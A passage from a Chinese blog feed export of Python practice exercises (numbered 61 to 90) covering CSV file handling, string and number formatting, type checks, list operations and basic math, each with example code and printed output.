<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test73</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">r'./csv_data.csv'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> [[<span class="number">0.468</span>,<span class="number">0.975</span>,<span class="number">0.446</span>],[<span class="number">0.718</span>,<span class="number">0.826</span>,<span class="number">0.359</span>]]:</span><br><span class="line">            line_len = fp.write(<span class="string">'%s\n'</span> % (<span class="string">','</span>.join([str(col) <span class="keyword">for</span> col <span class="keyword">in</span> row])))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	null</span><br></pre></td></tr></table></figure>

<p>74、从 csv_data.csv 文件中读出二维列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test74</span><span class="params">()</span>:</span></span><br><span class="line">    data = list()</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">r'./csv_data.csv'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fp.readlines():</span><br><span class="line">            data.append([float(item) <span class="keyword">for</span> item <span class="keyword">in</span> line.strip().split(<span class="string">','</span>)])</span><br><span class="line">    </span><br><span class="line">    print(<span class="string">"res_data = &#123;0&#125;"</span>.format(data))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	res_data = [[<span class="number">0.468</span>, <span class="number">0.975</span>, <span class="number">0.446</span>], [<span class="number">0.718</span>, <span class="number">0.826</span>, <span class="number">0.359</span>]]</span><br></pre></td></tr></table></figure>

<p>75、向 csv_data.csv 文件追加二维列表 [[1.468,1.975,1.446],[1.718,1.826,1.359]]，然后读出所有数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test75</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">r'./csv_data.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> [[<span class="number">1.468</span>,<span class="number">1.975</span>,<span class="number">1.446</span>],[<span class="number">1.718</span>,<span class="number">1.826</span>,<span class="number">1.359</span>]]:</span><br><span class="line">            line_len = fp.write(<span class="string">'%s\n'</span> % (<span class="string">','</span>.join([str(col) <span class="keyword">for</span> col <span class="keyword">in</span> row])))</span><br><span class="line"></span><br><span class="line">    data = list()</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">r'./csv_data.csv'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fp.readlines():</span><br><span class="line">            data.append([float(item) <span class="keyword">for</span> item <span class="keyword">in</span> line.strip().split(<span class="string">','</span>)])</span><br><span class="line">    </span><br><span class="line">    print(<span class="string">"res_data = &#123;0&#125;"</span>.format(data))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	res_data = [[<span class="number">0.468</span>, <span class="number">0.975</span>, <span class="number">0.446</span>], [<span class="number">0.718</span>, <span class="number">0.826</span>, <span class="number">0.359</span>], [<span class="number">1.468</span>, <span class="number">1.975</span>, <span class="number">1.446</span>], [<span class="number">1.718</span>, <span class="number">1.826</span>, <span class="number">1.359</span>]]</span><br></pre></td></tr></table></figure>

<p>76、交换变量 x 和 y 的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test76</span><span class="params">()</span>:</span></span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    y = <span class="number">2</span></span><br><span class="line">    print(<span class="string">"x = &#123;0&#125; y = &#123;1&#125;"</span>.format(x, y))</span><br><span class="line">    x, y = y, x</span><br><span class="line">    print(<span class="string">"x = &#123;0&#125; y = &#123;1&#125;"</span>.format(x, y))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>  </span><br><span class="line">    x = <span class="number">1</span> y = <span class="number">2</span></span><br><span class="line">    x = <span class="number">2</span> y = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>77、判断给定的参数 x 是否是整形</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test77</span><span class="params">()</span>:</span></span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    y = <span class="string">'1'</span></span><br><span class="line">    print(<span class="string">"res x is int = &#123;0&#125; y is int &#123;1&#125;"</span>.format(isinstance(x, int), isinstance(y, int)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line">	res x <span class="keyword">is</span> int = <span class="literal">True</span> y <span class="keyword">is</span> int <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>78、判断给定的参数 x 是否为列表或元组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test78</span><span class="params">()</span>:</span></span><br><span class="line">    x = list()</span><br><span class="line">    y = tuple()</span><br><span class="line">    print(<span class="string">"res x is list = &#123;0&#125; y is tuple = &#123;1&#125;"</span>.format(isinstance(x, list), isinstance(y, list)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	res x <span class="keyword">is</span> list = <span class="literal">True</span> y <span class="keyword">is</span> tuple = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>79、判断 ‘<a href="http://www.caidexin.com’" target="_blank" rel="noopener">http://www.caidexin.com’</a> 是否以 ‘http://’ 或 ‘https://’ 开头。若是，则返回 ‘http’ 或 ‘https’；否则，返回None</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test79</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = <span class="string">r'http://www.caidexin.com'</span></span><br><span class="line">    <span class="keyword">if</span> test_str.startswith((<span class="string">r'http://'</span>, <span class="string">r'https://'</span>)):</span><br><span class="line">        print(<span class="string">"res = &#123;0&#125;"</span>.format(test_str.split(<span class="string">r':'</span>)[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"res = None"</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	res = http</span><br></pre></td></tr></table></figure>

<p>80、判断 ‘<a href="http://www.caidexin.com’" target="_blank" rel="noopener">http://www.caidexin.com’</a> 是否以 ‘.com’ 或 ‘.net’ 结束。若是，则返回 ‘com’ 或 ‘net’；否则，返回None</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test80</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = <span class="string">r'http://www.caidexin.com'</span></span><br><span class="line">    <span class="keyword">if</span> test_str.endswith((<span class="string">r'com'</span>,<span class="string">r'net'</span>)):</span><br><span class="line">        print(<span class="string">"res = &#123;0&#125;"</span>.format(test_str.split(<span class="string">r'.'</span>)[<span class="number">-1</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"res = None"</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	res = com</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python语感专项</category>
      </categories>
      <tags>
        <tag>python语感</tag>
        <tag>others</tag>
      </tags>
  </entry>
  <entry>
    <title>python语感专项-7</title>
    <url>/2020/02/18/blog_formal/%E5%BC%80%E5%8F%91/python/python100-7/</url>
    <content><![CDATA[<h1 id="python语感专项"><a href="#python语感专项" class="headerlink" title="python语感专项"></a>python语感专项</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>和我们学习任何一门语言一样，一个很重要的点就是培养语感，本文来自互联网整理+自己的见解</p>
<a id="more"></a>

<h2 id="第七拍"><a href="#第七拍" class="headerlink" title="第七拍"></a>第七拍</h2><p>61、将字符串 ‘abc’ 相邻的两个字母之间加上半角逗号，生成新的字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test61</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = <span class="string">'abc'</span></span><br><span class="line">    print(<span class="string">"ori test_str = &#123;0&#125;"</span>.format(test_str))</span><br><span class="line">    print(<span class="string">"res test_str = &#123;0&#125;"</span>.format(<span class="string">','</span>.join(test_str)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_str = abc</span><br><span class="line">    res test_str = a,b,c</span><br></pre></td></tr></table></figure>

<p>62、输入手机号码，输出形如 ‘Mobile: 186 6677 7788’ 的字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test62</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># iphone_str = input("input phone num: ")</span></span><br><span class="line">    iphone_str = <span class="string">'18888888888'</span></span><br><span class="line">    print(<span class="string">"Mobile: %s %s %s"</span> % (iphone_str[:<span class="number">3</span>], iphone_str[<span class="number">3</span>:<span class="number">7</span>], iphone_str[<span class="number">7</span>:]))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	Mobile: <span class="number">188</span> <span class="number">8888</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p>63、输入年月日时分秒，输出形如 ‘2019-05-01 12:00:00’ 的字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test63</span><span class="params">()</span>:</span></span><br><span class="line">    date_str = <span class="string">'2020 12 12 8 30 30'</span></span><br><span class="line">    Y,M,D,h,m,s = date_str.split()</span><br><span class="line">    Y,M,D,h,m,s = int(Y),int(M),int(D),int(h),int(m),int(s)</span><br><span class="line">    print(<span class="string">"%04d-%02d-%02d %02d:%02d:%02d"</span> % (Y,M,D,h,m,s))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	<span class="number">2020</span><span class="number">-12</span><span class="number">-12</span> <span class="number">08</span>:<span class="number">30</span>:<span class="number">30</span></span><br></pre></td></tr></table></figure>

<p>64、给定两个浮点数 3.1415926 和 2.7182818，格式化输出字符串 ‘pi = 3.1416, e = 2.7183’</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test64</span><span class="params">()</span>:</span></span><br><span class="line">    test_a = <span class="number">3.1415926</span></span><br><span class="line">    test_b = <span class="number">2.7182818</span></span><br><span class="line">    print(<span class="string">"ori test_a = &#123;0&#125; test_b = &#123;1&#125;"</span>.format(test_a, test_b))</span><br><span class="line">    print(<span class="string">"res test_a = %0.4f test_b = %0.4f"</span> % (test_a, test_b))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_a = <span class="number">3.1415926</span> test_b = <span class="number">2.7182818</span></span><br><span class="line">    res test_a = <span class="number">3.1416</span> test_b = <span class="number">2.7183</span></span><br></pre></td></tr></table></figure>

<p>65、将 0.00774592 和 356800000 格式化输出为科学计数法字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test65</span><span class="params">()</span>:</span></span><br><span class="line">    test_a = <span class="number">0.00774592</span></span><br><span class="line">    test_b = <span class="number">356800000</span></span><br><span class="line">    print(<span class="string">"ori test_a = &#123;0&#125; test_b = &#123;1&#125;"</span>.format(test_a, test_b))</span><br><span class="line">    print(<span class="string">"res test_a = %e test_b = %E"</span> % (test_a, test_b))</span><br><span class="line">    print(<span class="string">"res test_a = %E test_b = %e"</span> % (test_a, test_b))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_a = <span class="number">0.00774592</span> test_b = <span class="number">356800000</span></span><br><span class="line">    res test_a = <span class="number">7.745920e-03</span> test_b = <span class="number">3.568000E+08</span></span><br><span class="line">    res test_a = <span class="number">7.745920E-03</span> test_b = <span class="number">3.568000e+08</span></span><br></pre></td></tr></table></figure>

<p>66、将十进制整数 240 格式化为八进制和十六进制的字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test66</span><span class="params">()</span>:</span></span><br><span class="line">    test_a = <span class="number">240</span></span><br><span class="line">    print(<span class="string">"res = %o %x"</span> % (test_a, test_a))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	res = <span class="number">360</span> f0</span><br></pre></td></tr></table></figure>

<p>67、将十进制整数 240 转为二进制、八进制、十六进制的字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test67</span><span class="params">()</span>:</span></span><br><span class="line">    test_a = <span class="number">240</span></span><br><span class="line">    print(<span class="string">"res = %s %s %s"</span> % (bin(test_a), oct(test_a), hex(test_a)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line">	res = <span class="number">0b11110000</span> <span class="number">0o360</span> <span class="number">0xf0</span></span><br></pre></td></tr></table></figure>

<p>68、将字符串 ‘10100’ 按照二进制、八进制、十进制、十六进制转为整数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test68</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = <span class="string">'10100'</span></span><br><span class="line">    print(<span class="string">"res = &#123;0&#125; &#123;1&#125; &#123;2&#125; &#123;3&#125;"</span>.format(int(test_str, base=<span class="number">2</span>), int(test_str, base=<span class="number">8</span>), int(test_str, base=<span class="number">10</span>), int(test_str, base=<span class="number">16</span>)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	res = <span class="number">20</span> <span class="number">4160</span> <span class="number">10100</span> <span class="number">65792</span></span><br></pre></td></tr></table></figure>

<p>69、求二进制整数1010、八进制整数65、十进制整数52、十六进制整数b4的和。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test69</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"res = &#123;0&#125;"</span>.format(<span class="number">0b1010</span>+<span class="number">0o65</span>+<span class="number">52</span>+<span class="number">0xb4</span>))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	res = <span class="number">295</span></span><br></pre></td></tr></table></figure>

<p>70、将列表 [0,1,2,3.14,‘x’,None,’’,list(),{5}] 中各个元素转为布尔型。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test70</span><span class="params">()</span>:</span></span><br><span class="line">    test_list = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3.14</span>,<span class="string">'x'</span>,<span class="literal">None</span>,<span class="string">''</span>,list(),&#123;<span class="number">5</span>&#125;]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    res_list = [bool(i) <span class="keyword">for</span> i <span class="keyword">in</span> test_list]</span><br><span class="line">    print(<span class="string">"res test_list = &#123;0&#125;"</span>.format(res_list))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_list = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3.14</span>, <span class="string">'x'</span>, <span class="literal">None</span>, <span class="string">''</span>, [], &#123;<span class="number">5</span>&#125;]</span><br><span class="line">    res test_list = [<span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">True</span>, <span class="literal">True</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python语感专项</category>
      </categories>
      <tags>
        <tag>python语感</tag>
        <tag>others</tag>
      </tags>
  </entry>
  <entry>
    <title>python语感专项-9</title>
    <url>/2020/02/21/blog_formal/%E5%BC%80%E5%8F%91/python/python100-9/</url>
    <content><![CDATA[<h1 id="python语感专项"><a href="#python语感专项" class="headerlink" title="python语感专项"></a>python语感专项</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>和我们学习任何一门语言一样，一个很重要的点就是培养语感，本文来自互联网整理+自己的见解</p>
<a id="more"></a>

<h2 id="第九拍"><a href="#第九拍" class="headerlink" title="第九拍"></a>第九拍</h2><p>81、将列表 [3,‘a’,5.2,4,{},9,[]] 中 大于3的整数或浮点数置为1，其余置为0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test81</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 81"</span>)</span><br><span class="line">    test_list = [<span class="number">3</span>,<span class="string">'a'</span>,<span class="number">5.2</span>,<span class="number">4</span>,&#123;&#125;,<span class="number">9</span>,[]]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    res_list = [<span class="number">1</span> <span class="keyword">if</span> (isinstance(i, int) <span class="keyword">or</span> isinstance(i, float)) <span class="keyword">and</span> i &gt; <span class="number">3</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> test_list]</span><br><span class="line">    print(<span class="string">"res_list = &#123;0&#125;"</span>.format(res_list))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># or</span></span><br><span class="line">    res_list = [<span class="number">1</span> <span class="keyword">if</span> isinstance(i, (int, float)) <span class="keyword">and</span> i &gt; <span class="number">3</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> test_list]</span><br><span class="line">    print(<span class="string">"res_list = &#123;0&#125;"</span>.format(res_list))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	begin test <span class="number">81</span></span><br><span class="line">    ori test_list = [<span class="number">3</span>, <span class="string">'a'</span>, <span class="number">5.2</span>, <span class="number">4</span>, &#123;&#125;, <span class="number">9</span>, []]</span><br><span class="line">    res_list = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line">    res_list = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>82、a,b 是两个数字，返回其中较小者或最大者</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test82</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 82"</span>)</span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    b = <span class="number">2</span></span><br><span class="line">    print(<span class="string">"min(a, b) = &#123;0&#125; max(a, b) = &#123;1&#125;"</span>.format(min(a,b), max(a,b)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">	begin test <span class="number">82</span></span><br><span class="line">	min(a, b) = <span class="number">1</span> max(a, b) = <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>83、找到列表 [8,5,2,4,3,6,5,5,1,4,5] 中出现最频繁的数字以及出现的次数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test83</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 83"</span>)</span><br><span class="line">    test_list = [<span class="number">8</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    res_num = max([test_list.count(i) <span class="keyword">for</span> i <span class="keyword">in</span> test_list])</span><br><span class="line">    print(<span class="string">"res_num = &#123;0&#125;"</span>.format(res_num))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># right</span></span><br><span class="line">    print(<span class="string">"temp set = &#123;0&#125;"</span>.format(set(test_list)))</span><br><span class="line">    print(<span class="string">"temp list = &#123;0&#125;"</span>.format(list(set(test_list))))</span><br><span class="line">    res = max(set(test_list), key=test_list.count)</span><br><span class="line">    res_num = test_list.count(res)</span><br><span class="line">    print(<span class="string">"res = &#123;0&#125; res_num = &#123;1&#125;"</span>.format(res, res_num))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># or</span></span><br><span class="line">    res = max(test_list, key=test_list.count)</span><br><span class="line">    res_num = test_list.count(res)</span><br><span class="line">    print(<span class="string">"res = &#123;0&#125; res_num = &#123;1&#125;"</span>.format(res, res_num))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    begin test <span class="number">83</span></span><br><span class="line">    ori test_list = [<span class="number">8</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    res_num = <span class="number">4</span></span><br><span class="line">    temp set = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>&#125;</span><br><span class="line">    temp list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>]</span><br><span class="line">    res = <span class="number">5</span> res_num = <span class="number">4</span></span><br><span class="line">    res = <span class="number">5</span> res_num = <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>84、将二维列表 [[1], [‘a’,‘b’], [2.3, 4.5, 6.7]] 转为 一维列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test84</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 84"</span>)</span><br><span class="line">    test_list = [[<span class="number">1</span>], [<span class="string">'a'</span>,<span class="string">'b'</span>], [<span class="number">2.3</span>, <span class="number">4.5</span>, <span class="number">6.7</span>]]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    res_list = sum(test_list, [])</span><br><span class="line">    print(<span class="string">"res test_list = &#123;0&#125;"</span>.format(res_list))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    begin test <span class="number">84</span></span><br><span class="line">    ori test_list = [[<span class="number">1</span>], [<span class="string">'a'</span>, <span class="string">'b'</span>], [<span class="number">2.3</span>, <span class="number">4.5</span>, <span class="number">6.7</span>]]</span><br><span class="line">    res test_list = [<span class="number">1</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="number">2.3</span>, <span class="number">4.5</span>, <span class="number">6.7</span>]</span><br></pre></td></tr></table></figure>

<p>85、将等长的键列表和值列表转为字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test85</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 85"</span>)</span><br><span class="line">    test_list_a = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>]</span><br><span class="line">    test_list_b = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">    print(<span class="string">"res test_list_a = &#123;0&#125; test_list_b = &#123;1&#125;"</span>.format(test_list_a, test_list_b))</span><br><span class="line">    test_dict = dict(zip(test_list_a, test_list_b))</span><br><span class="line">    print(<span class="string">"res dict = &#123;0&#125;"</span>.format(test_dict))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    begin test <span class="number">85</span></span><br><span class="line">    res test_list_a = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>] test_list_b = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">    res dict = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>, <span class="string">'c'</span>: <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure>

<p>86、使用链状比较操作符重写逻辑表达式 a &gt; 10 and a &lt; 20</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test86</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 86"</span>)</span><br><span class="line">    a = <span class="number">15</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">10</span> &lt; a &lt; <span class="number">20</span>:</span><br><span class="line">        print(<span class="string">"0 &lt; a &lt; 20"</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    begin test <span class="number">86</span></span><br><span class="line">    <span class="number">0</span> &lt; a &lt; <span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>87、写一个函数，以0.1秒的间隔不换行打印30次由函数参数传入的字符，实现类似打字机的效果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test87</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 87"</span>)</span><br><span class="line">    <span class="keyword">import</span> time</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        print(<span class="string">'*'</span>, end = <span class="string">' '</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line">    begin test <span class="number">87</span></span><br><span class="line">    * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *</span><br></pre></td></tr></table></figure>

<p>88、数字列表求和</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test88</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 88"</span>)</span><br><span class="line">    test_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    print(<span class="string">"sum test_list = &#123;0&#125;"</span>.format(sum(test_list)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    begin test <span class="number">88</span></span><br><span class="line">    ori test_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line">    sum test_list = <span class="number">55</span></span><br></pre></td></tr></table></figure>

<p>89、返回数字列表中的最大值和最小值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test89</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 89"</span>)</span><br><span class="line">    test_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    print(<span class="string">"max test_list = &#123;0&#125;"</span>.format(max(test_list)))</span><br><span class="line">    print(<span class="string">"min test_list = &#123;0&#125;"</span>.format(min(test_list)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    begin test <span class="number">89</span></span><br><span class="line">    ori test_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line">    max test_list = <span class="number">10</span></span><br><span class="line">    min test_list = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>90、计算 5 的 3.5 方和 3 的立方根</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test90</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 90"</span>)</span><br><span class="line">    <span class="comment"># python3</span></span><br><span class="line">    <span class="comment"># &gt;&gt;&gt; 10/3</span></span><br><span class="line">    <span class="comment"># 3.3333333333333335</span></span><br><span class="line">    <span class="comment"># &gt;&gt;&gt; 10//3</span></span><br><span class="line">    <span class="comment"># 3</span></span><br><span class="line">    <span class="comment"># &gt;&gt;&gt; 10%3</span></span><br><span class="line">    <span class="comment"># 1</span></span><br><span class="line">    <span class="comment"># python2</span></span><br><span class="line">    <span class="comment"># &gt;&gt;&gt; 10/3</span></span><br><span class="line">    <span class="comment"># 3</span></span><br><span class="line">    <span class="comment"># &gt;&gt;&gt; 10//3</span></span><br><span class="line">    <span class="comment"># 3</span></span><br><span class="line">    <span class="comment"># &gt;&gt;&gt; 10%3</span></span><br><span class="line">    <span class="comment"># 1</span></span><br><span class="line">    <span class="comment"># &gt;&gt;&gt; 10*1.0/3</span></span><br><span class="line">    <span class="comment"># 3.3333333333333335</span></span><br><span class="line">    print(<span class="string">"res = &#123;0&#125; &#123;1&#125;"</span>.format(pow(<span class="number">5</span>, <span class="number">3.5</span>), pow(<span class="number">3</span>, <span class="number">1</span>/<span class="number">3</span>)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    begin test <span class="number">90</span></span><br><span class="line">    res = <span 